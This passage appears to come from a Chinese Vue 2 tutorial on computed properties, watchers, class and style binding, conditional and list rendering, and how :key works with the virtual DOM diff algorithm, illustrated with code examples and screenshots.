            msg : '计算属性-反转字符串案例',
            info : ''
        },
        methods : {
            hello(){
                console.log('hello方法执行了')
                return 'hello'
            }
        },
        computed : {
            hehe : {
                get(){
                    console.log('getter方法调用了')
                    return 'haha'
                },
                set(val){
                    console.log('setter方法调用了')
                }
            },
        }
    })
</script>
```

效果：

![image-20240423165427506](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404231656826.png)

**4、计算属性中的 this**

计算属性中的 this 就是 Vue 实例 vm。同样不能使用箭头函数，因为箭头函数中的 this 不是 Vue 实例 vm，是 window。

**5、使用计算属性实现反转字符串**

新加一个计算属性：

```html
<div id="app">
    <h1>{{msg}}</h1>
    输入的信息：<input type="text" v-model="info"> <br>
    反转的信息：{{reversedInfo}}<br>
    反转的信息：{{reversedInfo}}<br>
    反转的信息：{{reversedInfo}}<br>
    反转的信息：{{reversedInfo}}<br>
    反转的信息：{{reversedInfo}}<br>
</div>
<script>
    const vm = new Vue({
        el : '#app',
        data : {
            msg : '计算属性-反转字符串案例',
            info : ''
        },
        computed : {
            reversedInfo : { 
                get(){
                    return this.info.split('').reverse().join('')
                },
                set(val){
                   
                }
            } 
        }
    })
</script>
```

这样就能实现功能，且多次使用 reversedInfo 该属性也只会调用一次方法。

### 修改计算属性

计算属性中除了 除了 get 方法，也有 set 方法。

当修改计算属性的时候，set 方法被自动调用。

修改计算属性时不能直接修改计算属性：

```js
reversedInfo : { 
    get(){
        return this.info.split('').reverse().join('')
    },
    // 当修改计算属性的时候，set方法被自动调用。
    set(val){
        console.log('setter方法被调用了。')
        this.reversedInfo = val
    }
} 
```

因为 `this.reversedInfo = val` 是在修改计算属性的值，会调用 set 方法，就会产生递归的情况。

那怎么修改计算属性呢？

原理：计算属性的值变还是不变，取决于计算属性关联的 Vue 原始属性的值。

本质上：修改计算属性，实际上就是通过修改 Vue 的原始属性来实现的。

```js
reversedInfo : { 
    get(){
        return this.info.split('').reverse().join('')
    },
    set(val){
        console.log('setter方法被调用了。')
        this.info = val.split('').reverse().join('')
    }
} 
```

### 简写形式

计算属性一般只用来做展示，所以他的 set 方法很少用。在**不用 set 方法的情况下**，有一个简写方式：

```js
reversedInfo(){ 
    return this.info.split('').reverse().join('')
}
```

注意：这不是一个方法，这是一个计算属性，所以使用计算属性的是还是这样使用：

```html
{{reversedInfo}}
```

而不是这样：

```html
{{reversedInfo()}}
```

## 侦听/监视属性的变化

侦听属性的变化其实就是监视某个属性的变化。当被监视的属性一旦发生改变时，执行某段代码。

监视属性变化时需要使用 watch 配置项。

在 watch 配置项里面写要监听的属性，可以监视 Vue 的原有属性，也可以监视计算属性。

### 监听原有属性

比如，给一个输入框，默认值为数字 0，监听这个数字的变化：

```html
<div id="app">
    <h1>{{msg}}</h1>
    数字：<input type="text" v-model="number"><br>
</div>
<script>
    const vm = new Vue({
        el : '#app',
        data : {
            number : 0,
        },
        watch : {
            // 要监听的属性
            number : {
                handler(newValue, oldValue){
                    console.log(newValue, oldValue)
                }
            },
        }
    })
</script>
```

在监听的属性中，必须有个固定的方法 handler，且名字必须叫 handler。

+ 当被监视的属性发生变化的时候，handler 就会自动调用一次。
+ handler 方法上有两个参数：第一个参数 newValue，第二个参数是 oldValue（名字可以随便取）
  + newValue 是属性值改变之后的新值。
  + oldValue 是属性值改变之前的旧值。

比如，此时初始 number 是 0：

![image-20240423172757382](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404231727657.png)

改变 number 为 1：

![image-20240423172812599](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404231728877.png)

后面的是旧值，前面的是新值。

### 监听计算属性

```js
const vm = new Vue({
    el : '#app',
    data : {
        number : 0,
    },
    computed : {
        hehe(){
            return 'haha' + this.number
        }
    },
    watch : {
        // 要监听的属性
        hehe : {
            handler(a , b){
                console.log(a, b)
            }
        } 
    }
})
```

初始是这样的：

![image-20240423173607305](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404231736602.png)

变化之后：

![image-20240423173619374](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404231736665.png)

### 初始化调用handler

如果想在页面打开之后就调用一次 handler 的话，有个属性：

```js
watch : {
    // 要监听的属性
    number : {
        immediate : true,
        handler(newValue, oldValue){
            console.log(newValue, oldValue)
        }
    },
}
```

immediate 为 true 表示初始化的时候，调用一次 handler 方法。

### handler中的this

this 是当前的 Vue 实例。

如果该函数是箭头函数，这个 this 是 window 对象。不建议使用箭头函数。

### 深度监视

如果要监视的属性是 data 中的一个属性对象中的属性：

```json
data : {
    number2 : 0,
    msg : '侦听属性的变化',
    number : 0,
    a : {
        b : 0
    }
},
```

比如，要监视上面的这个 b，按照之前的写法：

```html
<div id="app">
    <h1>{{msg}}</h1>
    数字：<input type="text" v-model="a.b"><br>
</div>
<script>
    const vm = new Vue({
        el : '#app',
        data : {
            msg : '侦听属性的变化',
            number : 0,
            a : {
                b : 0
            }
        },
        watch : {
            b : {  
                handler(newValue, oldValue){
                    console.log('@')
                } 
            }
        }
    })
</script>
```

这样写的话，当文本框中的值变化后，没有任何反应。无法监视 b 属性，这是因为 data 中没有 b 属性，b 是属性 a 的一个属性。

那么监视 a 可以吗？可以监视 a，当 a 的值变化后就会触发 handler 函数，但是 a 中保存的是一个对象的内存地址，只有新建一个对象赋给 a 后，a 的值才算改变，handler 才会被执行，所以改变 b 的值也不会触发 handler 函数。

那么监视 a.b 呢？

```js
watch: {
    a.b: {
        handler(newValue, oldValue) {
            console.log('@')
        }
    }
}
```

会报错：

![image-20240423200640071](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404232006380.png)

应该加引号，因为对象的 key 其实本来就是有引号的，只不过一般可以省略，但是当 key 中包含特殊字符时，就不能省略了：

```js
watch: {
    'a.b': {
        handler(newValue, oldValue) {
            console.log('@')
        }
    }
}
```

所以如果监视的属性具有多级结构，一定要添加单引号：

![image-20240423201219227](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404232012517.png)

如果在属性 a 中除了有个属性 b，还有属性 c、属性 d 等，想要监视 a 中的所有属性的话，是不是需要像 a.b 这样都写呢？

不需要。比如有这种属性：

```json
a : {
    b : 0,
    c : 0,
    d : {
        e : {
            f : 0
        }
    }
}
```

a 中的所有属性都要监视，就要使用深度监视：

```js
watch: {
    a : {
        // 启用深度监视，默认是不开启深度监视的。
        deep : true,  
		handler(newValue, oldValue){
            console.log('@')
        } 
    },
}
```

什么时候开启深度监视：当你需要监视一个具有多级结构的属性，并且监视所有的属性，需要启用深度监视。

### 后期添加监视

Vue 实例创建完后，想要对 Vue 实例中的属性进行监视。

如何后期添加监视？调用 Vue 相关的 API 即可。

语法：`vm.$watch('被监视的属性名', {})`

```js
vm.$watch('number', {
    immediate : true,
    deep : true,
    handler(newValue, oldValue){
        console.log(newValue, oldValue)
    }
})
```

### 监视的简写

监视某个属性的时候，也有简写形式，什么时候启用简写形式？

当只有 handler 回调函数的时候，可以使用简写形式。

```js
watch: {
    number(newValue, oldValue){
        console.log(newValue, oldValue)
    },
}
```

后期添加监视也可以简写：

```js
vm.$watch('number', function(newValue, oldValue){
    console.log(newValue, oldValue)
})
```

### computed和watch如何选择

在大部分情况下，计算属性和监视是可以互换的。

实现一个功能，两个输入框，输入两个数字，展示两个数字的大小关系。

**使用watch实现**

```html
<div id="app">
    数字1：<input type="text" v-model="num1"><br>
    数字2：<input type="text" v-model="num2"><br>
    大小：{{msg}}
</div>
<script>
    const vm = new Vue({
        el: '#app',
        data: {
            num1 : 0,
            num2 : 0,
            msg : '',
        },
        watch: {
            num1 : {
                immediate : true,
                handler(val) {
                    let res = val - this.num2;
                    let op = '';
                    if (res == 0) op = '=';
                    else if (res < 0) op = '<';
                    else op = '>';
                    this.msg = val + op + this.num2;
                }
            },
            num2: {
                immediate: true,
                handler(val) {
                    let res = this.num1 - val;
                    let op = '';
                    if (res == 0) op = '=';
                    else if (res < 0) op = '<';
                    else op = '>';
                    this.msg = this.num1 + op + val;
                }
            },
        }
    })
</script>
```

初始：

![image-20240423203839364](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404232038676.png)

变化：

![image-20240423203825804](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404232038102.png)

**使用computed实现**

```html
<div id="app">
    数字1：<input type="text" v-model="num1"><br>
    数字2：<input type="text" v-model="num2"><br>
    大小：{{msg}}
</div>
<script>
    const vm = new Vue({
        el: '#app',
        data: {
            num1 : 0,
            num2 : 0,
        },
        computed : {
            // 计算属性的简写方式
            msg(){
                let res = this.num1 - this.num2;
                if (res == 0) return this.num1 + ' = ' + this.num2;
                if (res < 0) return this.num1 + ' < ' + this.num2;
                if (res > 0) return this.num1 + ' > ' + this.num2;
            }
        }
    })
</script>
```

初始：

![image-20240423204321588](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404232043901.png)

变化：

![image-20240423204337195](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404232043505.png)

显然这种情况，应该选择使用 computed，代码更加简单、简洁。

所以：**computed 和 watch 如果都能够完成某个功能，优先选择 computed。**

### 必须使用watch的情况

有一种情况下，必须使用 watch，computed 无法完成！如果在程序当中采用了异步的方式，只能使用 watch。

比如，要求在输入数字的 3 秒后再比较大小，这时就需要使用 watch 来做。

延迟 3 秒使用 setTimeOut 即可，在计算属性中：

```json
computed : {
    msg(){
        let result = this.num1 - this.num2
        // 这里采用了异步方式，
        setTimeout(() => {
            if(result == 0){
                return this.num1 + ' = ' + this.num2
            }else if(result > 0){
                return  this.num1 + ' > ' + this.num2
            }else {
                return  this.num1 + ' < ' + this.num2
            }    
        }, 1000 * 3)

    }
}
```

箭头函数的返回值是将值返回给调用者，这里的箭头函数是 javascript 引擎去调用。所以最终 return 的时候，也会将值返回给 javascript 引擎。

所以此时使用计算属性不行。

使用 watch：

```json
watch: {
    num1 : {
        immediate : true,
        handler(val) {
            let res = val - this.num2;
            setTimeout(() => {
                if(res == 0){
                    this.msg = val + ' = ' + this.num2
                }else if(res > 0){
                    this.msg = val + ' > ' + this.num2
                }else {
                    this.msg = val + ' < ' + this.num2
                }    
            }, 1000 * 3)
        }
    },
    num2: {
        immediate: true,
        handler(val) {
            let res = this.num1 - val;
            setTimeout(() => {
                if(res == 0){
                    this.msg = this.num1 + ' = ' + val
                }else if(res > 0){
                    this.msg = this.num1 + ' > ' + val
                }else {
                    this.msg = this.num1 + ' < ' + val
                }    
            }, 1000 * 3)
        }
    },
}
```

以上代码就能实现功能。

在以上代码中使用了箭头函数，可以输出一下箭头函数中的 this，发现该箭头函数中的 this 就是 Vue 实例：

```json
setTimeout(() => {
    console.log(this);
    if(res == 0){
        this.msg = this.num1 + ' = ' + val
    }else if(res > 0){
        this.msg = this.num1 + ' > ' + val
    }else {
        this.msg = this.num1 + ' < ' + val
    }    
}, 1000 * 3)
```

![image-20240423205617746](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404232056064.png)

这是因为，这个箭头函数不是 Vue 管理的，是 javascript 引擎负责管理的，调用这个箭头函数的还是 window。但是箭头函数没有 this，只能向上一级找 this，上一级是 num1，num1 是 Vue 实例的属性，所以 this 是 Vue 实例。

而将该箭头函数变为普通函数的话，this 就是指向了 window：

```json
setTimeout(function() {
    console.log(this);
    if(res == 0){
        this.msg = this.num1 + ' = ' + val
    }else if(res > 0){
        this.msg = this.num1 + ' > ' + val
    }else {
        this.msg = this.num1 + ' < ' + val
    }    
}, 1000 * 3)
```

![image-20240423205631590](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404232056905.png)

这是因为，setTimeOut 中的这个函数虽然不是箭头函数，但是并不是属于 Vue 管理的，是异步的，3 秒后调用这个函数的对象是 window 负责调用的，所以他的 this 是 window。

**什么时候使用箭头函数？什么时候使用普通函数？**

看看这个函数是否属于 Vue 管理的。

+ 是 Vue 管理的函数：统一写普通函数。
+ 不是 Vue 管理的函数：统一写箭头函数。

## 动态绑定样式

普通 html 中，可以使用 class 和 style 两个属性绑定元素的样式：

```html
<div class="" style=""></div>
```

class 和 style 都是元素的属性，所以我们可以用 `v-bind` 处理它们：只需要通过表达式计算出字符串结果即可

```html
<div v-bind:class="" v-bind:style=""></div>
```

简写方式：

```html
<div :class="" :style=""></div>
```

在将 `v-bind` 用于 `class` 和 `style` 时，Vue.js 做了专门的增强。表达式结果的类型除了字符串之外，还可以是对象或数组。

现有代码：

```html
<head>
    <style>
        .static{
            border: 1px solid black;
            background-color: aquamarine;
        }
        .big{
            width: 200px;
            height: 200px;
        }
        .small{
            width: 100px;
            height: 100px;
        }
    </style>
</head>
<body>
    <div id="app">
        <div>{{msg}}</div>
    </div>
    <script>
        const vm = new Vue({
            el : '#app',
            data : {
                msg : 'Class绑定之字符串形式',
            },
        })
    </script>
</body>
```

### class绑定

#### 字符串形式

绑定样式静态写法：

```html
<div class="static small">{{msg}}</div>
```

![image-20240423211459231](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404232114562.png)

动静结合写法，使用 v-bind 绑定 class 属性，需要先在 data 中定义出值。适用场景：如果确定动态绑定的样式个数只有 1 个，但是名字不确定：

```html
<div class="static" :class="c1">{{msg}}</div>

<script>
    const vm = new Vue({
        el : '#app',
        data : {
            msg : 'Class绑定之字符串形式',
            c1 : 'small'
        },
    })
</script>
```

![image-20240423211621192](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404232116523.png)

通过按钮设置变大变小：

```html
<button @click="changeBig">变大</button>
<button @click="changeSmall">变小</button>
<div class="static" :class="c1">{{msg}}</div>

<script>
    const vm = new Vue({
        el : '#app',
        data : {
            msg : 'Class绑定之字符串形式',
            c1 : 'small'
        },
        methods: {
            changeBig(){
                this.c1 = 'big'
            },
            changeSmall(){
                this.c1 = 'small'
            }
        },
    })
</script>
```

#### 数组形式

现有代码：

```html
<head>
    <style>
        .static {
            border: 1px solid black;
            width: 100px;
            height: 100px;
        }
        .active {
            background-color: green;
        }
        .text-danger {
            color: red;
        }
    </style>
</head>

<body>
    <script>
        const vm = new Vue({
            el : '#app',
            data : {
                msg : 'Class绑定之数组形式',
            }
        })
    </script>
</body>
```

静态绑定写法：

```html
<div class="static active text-danger">{{msg}}</div>
```

![image-20240423212217637](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404232122983.png)

动静结合写法，直接在 v-bind 指令中使用数组：

```html
<div class="static" :class="['active','text-danger']">{{msg}}</div>
```

![image-20240423212404216](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404232124560.png)

数组中使用变量，注意变量不要加单引号：

```html
<div class="static" :class="[c1, c2]">{{msg}}</div>

<script>
    const vm = new Vue({
        el : '#app',
        data : {
            msg : 'Class绑定之数组形式',
            c1 : 'active',
            c2 : 'text-danger',
        }
    })
</script>
```

![image-20240423212404216](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404232125979.png)

使用数组变量，适用场景：当样式的个数不确定，并且样式的名字也不确定的时候，可以采用数组形式。：

```html
<div class="static" :class="classArray">{{msg}}</div>

<script>
    const vm = new Vue({
        el : '#app',
        data : {
            msg : 'Class绑定之数组形式',
            classArray : ['active', 'text-danger']
        }
    })
</script>
```

![image-20240423212404216](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404232126058.png)

#### 对象形式

样式的个数是固定的，样式的名字也是固定的，但是需要动态的决定样式用还是不用：

```html
<div class="static" :class="classObj">{{msg}}</div>

<script>
    const vm = new Vue({
        el : '#app',
        classObj : {
            // 该对象中属性的名字必须和样式名一致。
            active : false,
            'text-danger' : true
        }
    })
</script>
```

+ 每个属性名都是有单引号括起来的，但是可以省，'text-danger' 不能省略是因为中间有个减号

对象中的属性为 true 的会被渲染，为 false 的不会被渲染。

也可以直接在 v-bind 中直接创建对象，但是很少用：

```html
<div class="static" :class="{active:true,'text-danger':false}">{{msg}}</div>
```

### style绑定

用的不多。

现有代码：

```html
<head>
    <style>
        .static {
            border: 1px solid black;
            width: 100px;
            height: 100px;
        }
    </style>
</head>
<body>
    <div id="app">
        
    </div>
    <script>
        const vm = new Vue({
            el : '#app',
            data : {
                msg : 'Style绑定',
            }
        })
    </script>
</body>
```

静态写法：

```html
<div class="static" style="background-color: green;">{{msg}}</div>
```

![image-20240423213408744](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404232134107.png)

动态写法：字符串形式

```html
<div class="static" :style="myStyle">{{msg}}</div>

<script>
    const vm = new Vue({
        el : '#app',
        data : {
            msg : 'Style绑定',
            myStyle : 'background-color: gray;',
        }
    })
</script>
```

![image-20240423213719870](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404232137237.png)

动态写法：对象形式

```html
<div class="static" :style="styleObj1">{{msg}}</div>
<!-- backgroundColor 是属性名， gray 是属性值，一定要有单引号-->
<div class="static" :style="{backgroundColor: 'gray'}">{{msg}}</div>

<script>
    const vm = new Vue({
        el : '#app',
        data : {
            msg : 'Style绑定',
            styleObj1 : {
                backgroundColor: 'green'
            },
        }
    })
</script>
```

+ 细节：使用对象形式这种写法时，样式的属性名如果带有 `-` 的话，要去掉减号，改成大驼峰写法：background-color => backgroundColor；属性值要是一个字符串，要使用引号括起来。

![image-20240423213736790](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404232137154.png)

动态写法：数组形式

```html
<div class="static" :style="styleArray">{{msg}}</div>

<script>
    const vm = new Vue({
        el : '#app',
        data : {
            msg : 'Style绑定',
            styleArray : [
                {backgroundColor: 'green'},
                {color : 'red'}
            ]
        }
    })
</script>
```

## 条件渲染

### v-if

v-if 指令的值：true / false

+ true: 表示该元素会被渲染到页面上。
+ false: 表示该元素不会被渲染到页面上。（注意：不是修改了CSS样式，是这个元素压根没有加载）

```html
<div id="app">
    <h1>{{msg}}</h1>
    <div v-if="false">{{msg}}</div>
</div>
<script>
    const vm = new Vue({
        el : '#app',
        data : {
            msg : '条件渲染',
        }
    })
</script>
```

当 v-if 的值为 false 的时候，元素不会被加载，在页面中找不到该元素：

![image-20240424180444860](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404241805115.png)

#### v-else

实现一个小案例：给一个数字，一个按钮，点击按钮数字会加 1，如果数字是奇数，就显示 1 号图片，否则显示 2 号图片。

```html
<div id="app">
    <h1>{{msg}}</h1>
    <button @click="counter++">点我加1</button>

    <h3>{{counter}}</h3>

    <img :src="imgPath1" v-if="counter % 2 === 1">
    <img :src="imgPath1" v-if="counter % 2 === 0">
</div>
<script>
    const vm = new Vue({
        el : '#app',
        data : {
            msg : '条件渲染',
            counter : 1,
            imgPath1 : '../img/1.jpg',
            imgPath2 : '../img/2.jpg',
        }
    })
</script>
```

![image-20240424185744540](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404241857685.png)

在以上代码中，两张照片中一定只会显示一张，但是会执行两次 v-if 指令中的判断。为了提高效率，可以使用 v-else 指令。

```html
<img :src="imgPath1" v-if="counter % 2 === 1">
<img :src="imgPath2" v-else>
```

+ v-if 和 v-else 之间不能断开，也就是说中间不能有其他的元素

#### v-else-if

再实现一个小案例：输入一个数字表示温度，温度小于等于 10，输出寒冷；小于等于 25 输出凉爽；大于 25 输出炎热。

可以使用三个 v-if 指令来写，但是为了提高效率，可以使用 v-else-if ：

```html
温度：<input type="number" v-model="temprature"><br><br>
天气：<span v-if="temprature <= 10">寒冷</span>
<span v-else-if="temprature <= 25">凉爽</span>
<span v-else>炎热</span>

<script>
    const vm = new Vue({
        el : '#app',
        data : {
            temprature : 0
        }
    })
</script>
```

+ v-if v-else-if v-else 三者在使用的时候，中间不能断开。

### v-show

v-show 和 v-if 都可以实现显示和隐藏元素。

v-show 指令是通过修改元素的 CSS 样式的 display 属性来达到显示和隐藏的。当 v-show 的值是 true 的时候元素会显示，为 false 的时候元素会被隐藏（v-if 为 false 的话，元素不是被隐藏，是不会被加载）

```html
<div v-show="false">你可以看到我吗？</div>
```

![image-20240424191134834](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404241911976.png)

v-if 和 v-show 应该如何选择？

​      1. 如果一个元素在页面上被频繁的隐藏和显示，建议使用 v-show，因为此时使用 v-if 开销比较大。

​      2. v-if 的优点：页面加载速度快，提高了页面的渲染效率。

#### template元素

template 标签/元素只是起到占位的作用，不会真正的出现在页面上，也不会影响页面的结构。

```html
<template v-if="counter === 10">
    <input type="text">
    <input type="checkbox">
    <input type="radio">            
</template>
```

![image-20240424191720614](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404241917765.png)

## 列表渲染

### v-for遍历数组

需要动态的渲染一个列表时，需要重复渲染同一种元素时，就需要使用 v-for 。

v-for 的语法规则：

```js
v-for="(变量名,index) in/of 数组"
```

+ 变量名 代表了 数组中的每一个元素

比如，有一个列表：

```html
<div id="app">
    <ul>
        <li>张三</li>
        <li>李四</li>
        <li>王五</li>
    </ul>
</div>
```

现在想用动态的渲染出所有的名字，首先要先在 Vue 实例中定义一个数组：

```js
const vm = new Vue({
    el : '#app',
    data : {
        names : ['jack','lucy','james'],
    }
})
```

然后使用 v-for 指令：

```html
<ul>
    <li v-for="fdsafds in names">
        {{fdsafds}}
    </li>
</ul>
```

+ v-for 要写在循环项上。

![image-20240424212540056](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404242125200.png)

使用 of 也可以：

```html
<ul>
    <li v-for="name of names">
        {{name}}
    </li>
</ul>
```

还有第二个参数，表示下标：

```html
<ul>
    <li v-for="name,idx of names">
        {{name}}-{{idx}}
    </li>
</ul>
```

![image-20240424212742456](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404242127599.png)

假设遍历的数组中的元素是对象：

```js
const vm = new Vue({
    el : '#app',
    data : {
        vips : [
            {id:'111',name:'jack',age:20},
            {id:'222',name:'lucy',age:30},
            {id:'333',name:'james',age:40}
        ],
    }
})
```

循环遍历：

```html
<ul>
    <li v-for="(vip,index) of vips">
        会员名：{{vip.name}}，年龄：{{vip.age}}岁
    </li>
</ul>
```

![image-20240424213006632](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404242130798.png)

生成表格：

```html
<table>
    <tr>
        <th>序号</th>
        <th>会员名</th>
        <th>年龄</th>
        <th>选择</th>
    </tr>
    <tr v-for="(vip,index) in vips">
        <td>{{index+1}}</td>
        <td>{{vip.name}}</td>
        <td>{{vip.age}}</td>
        <td><input type="checkbox"></td>
    </tr>
</table>
```

![image-20240424213116263](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404242131414.png)

### 遍历对象的属性

创建一个对象：

```js
const vm = new Vue({
    el : '#app',
    data : {
        user : {
            id : '111',
            name : '张三',
            gender : '男'
        },
    }
})
```

v-for 命令还是有两个参数，第一个参数是属性的值，第二个参数是属性的名字：

```html
<ul>
    <li v-for="(value, propertyName) of user">
        {{propertyName}},{{value}}
    </li>
</ul>
```

![image-20240424213529582](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404242135742.png)

### 遍历字符串

给一个字符串：

```js
const vm = new Vue({
    el : '#app',
    data : {
        str : '动力节点',
    }
})
```

v-for 的参数和遍历数组时一样，第一个参数是字符串中的每个字符，第二个参数是下标（从0开始）：

```html
<ul>
    <li v-for="(c,index) of str">
        {{index}},{{c}}
    </li>
</ul>
```

![image-20240424213730215](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404242137375.png)

### 遍历指定的次数

指定一个次数：

```js
const vm = new Vue({
    el : '#app',
    data : {
        counter : 10
    }
})
```

v-for (前面的是数字，后面的是下标) 

```html
<ul>
    <li v-for="(num,index) of counter">
        {{index}}, {{num}}
    </li>
</ul>
```

![image-20240424213915984](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404242139152.png)

遍历 counter 中的每个数字。



## 虚拟dom与diff算法

此时有个程序：

```html
<div id="app">
    <h1>{{msg}}</h1>
    <table>
        <tr>
            <th>序号</th>
            <th>英雄</th>
            <th>能量值</th>
            <th>选择</th>
        </tr>
        <tr v-for="(hero,index) in heros">
            <td>{{index+1}}</td>
            <td>{{hero.name}}</td>
            <td>{{hero.power}}</td>
            <td><input type="checkbox"></td>
        </tr>
    </table>
</div>
<script>
    const vm = new Vue({
        el : '#app',
        data : {
            msg : '虚拟dom与diff算法',
            heros : [
                {id:'101',name:'艾格文',power:10000},
                {id:'102',name:'麦迪文',power:9000},
                {id:'103',name:'古尔丹',power:8000},
                {id:'104',name:'萨尔',power:6000}
            ]
        },
    })
</script>
```

![image-20240425084116112](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404250841254.png)

此时，想修改表格中的某一个英雄的名字，就是修改 data 中的数据，那么整个模板语句都会被重新渲染。

### :key属性

v-for 指令所在的标签中，还有一个非常重要的属性：`key`：

```html
<tr v-for="(hero,index) in heros"  :key="hero.id">
</tr>
```

如果没有指定 :key 属性，会自动拿 index 作为 key。这个 key 是这个 dom 元素的身份证号/唯一标识。

### 虚拟dom与diff算法

+ 虚拟 dom：在内存中的 dom 对象
+ diff 算法：一种能够快速比较出两个事物之间不同之处的算法

比如就只修改萨尔这个名字，如果要将整个表格都重新渲染一次的话那么效率就会很低。所以 Vue 框架就是使用了虚拟 dom 和 diff 算法来提高效率。

内存中的数据就是 data 中的数据，内存中的数据有了后，Vue 就会生成一个虚拟的 dom。有了虚拟的 dom 后，想将虚拟 dom 真实的渲染在页面上，就需要生成一个真实的 dom。

接下来要修改 data 中的数据，只要内存中的数据发生了修改，虚拟 dom 一定会重新生成。生成了新的虚拟 dom 后，就会使用 diff 算法去比较新的虚拟 dom 和旧的虚拟 dom，比如这是旧的虚拟 dom 中的元素：

```html
<tr key="0"><td>1</td> <td>艾格文</td> <td>10000</td> <td><input type="checkbox"></td></tr>
<tr key="1"><td>2</td> <td>麦迪文</td> <td>9000</td> <td><input type="checkbox"></td></tr>
<tr key="2"><td>3</td> <td>古尔丹</td> <td>8000</td> <td><input type="checkbox"></td></tr>
<tr key="3"><td>4</td> <td>萨尔</td> <td>6000</td> <td><input type="checkbox"></td></tr>
```

这是新的虚拟 dom 中的元素，只修改了 萨尔 为 麦文：

```html
<tr key="0"><td>1</td> <td>艾格文</td> <td>10000</td> <td><input type="checkbox"></td></tr>
<tr key="1"><td>2</td> <td>麦迪文</td> <td>9000</td> <td><input type="checkbox"></td></tr>
<tr key="2"><td>3</td> <td>古尔丹</td> <td>8000</td> <td><input type="checkbox"></td></tr>
<tr key="3"><td>4</td> <td>麦文</td> <td>6000</td> <td><input type="checkbox"></td></tr>
```

这时两个虚拟 dom 就会一个标签一个标签的比较，会先比较 key 值，如果 key 都不一样，说明这是两个没有关系的元素，就会将整行元素重新创建到真实 dom 中。如果第一行的第一个标签 `<tr>` ，一样的话，就会一直比较下去，如果这一行都是完全相同的话，那么这一行就是真实 dom 中的一个元素，不需要重新创建在真实的 dom 中。

直到比较到最后一行的第三个标签 `<td>` 发现不一样时，这时候新的虚拟 dom 会创建这个不一样的标签创建到真实的 dom 中，而该标签前后的其他标签，如果没有修改的话，依旧不会被重新创建，而是直接使用之前的。

所以，这样的话，修改了某处数据后，不会重新渲染整个表格，而是只需要重新渲染被修改的那个标签。

![虚拟dom与diff算法](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404250850693.png)

### key 的作用及原理

分析 一下：采用 index 作为 key 存在什么问题 ？

+ 第一个问题：效率低。
+ 第二个问题：非常严重了。产生了错乱。尤其是对数组当中的某些元素进行操作。（非末尾元素。）

现在在上面的程序中添加一个按钮，点击一次按钮，就会向 data 中的 heros 数组的头部添加一个元素。

```html
<div id="app">
    <h1>{{msg}}</h1>
    <table>
        <tr>
            <th>序号</th>
            <th>英雄</th>
            <th>能量值</th>
            <th>选择</th>
        </tr>
        <tr v-for="(hero,index) in heros">
            <td>{{index+1}}</td>
            <td>{{hero.name}}</td>
            <td>{{hero.power}}</td>
            <td><input type="checkbox"></td>
        </tr>
    </table>

    <button @click="add">添加英雄麦文</button>
</div>
<script>
    const vm = new Vue({
        el : '#app',
        data : {
            msg : '虚拟dom与diff算法',
            heros : [
                {id:'101',name:'艾格文',power:10000},
                {id:'102',name:'麦迪文',power:9000},
                {id:'103',name:'古尔丹',power:8000},
                {id:'104',name:'萨尔',power:6000}
            ]
        },
        methods : {
            add(){
                this.heros.unshift({id:'105',name:'麦文',power:9100})
            }
        }
    })
</script>
```

![image-20240425093018041](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404250930228.png)

功能没有问题，但是，向数组首位插入了元素之后，生成新的虚拟 dom 是：

```html
<tr key="0"><td>1</td> <td>麦文</td> <td>9100</td> <td><input type="checkbox"></td></tr>
<tr key="1"><td>2</td> <td>艾格文</td> <td>10000</td> <td><input type="checkbox"></td></tr>
<tr key="2"><td>3</td> <td>麦迪文</td> <td>9000</td> <td><input type="checkbox"></td></tr>
<tr key="3"><td>4</td> <td>古尔丹</td> <td>8000</td> <td><input type="checkbox"></td></tr>
<tr key="4"><td>5</td> <td>萨尔</td> <td>6000</td> <td><input type="checkbox"></td></tr>
```

而原先的旧的虚拟 dom 是：

```html
<tr key="0"><td>1</td> <td>艾格文</td> <td>10000</td> <td><input type="checkbox"></td></tr>
<tr key="1"><td>2</td> <td>麦迪文</td> <td>9000</td> <td><input type="checkbox"></td></tr>
<tr key="2"><td>3</td> <td>古尔丹</td> <td>8000</td> <td><input type="checkbox"></td></tr>
<tr key="3"><td>4</td> <td>萨尔</td> <td>6000</td> <td><input type="checkbox"></td></tr>
```

带入 Vue 执行 diff 算法的过程，发现以 index 做 key 的时候，这种情况下每个名字的单元格都要重新渲染，且会发生错乱的情况：勾选上原来第一行的复选框后，点击添加麦文，然后发现麦文的复选框被勾选了

![image-20240425141909667](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404251419866.png)

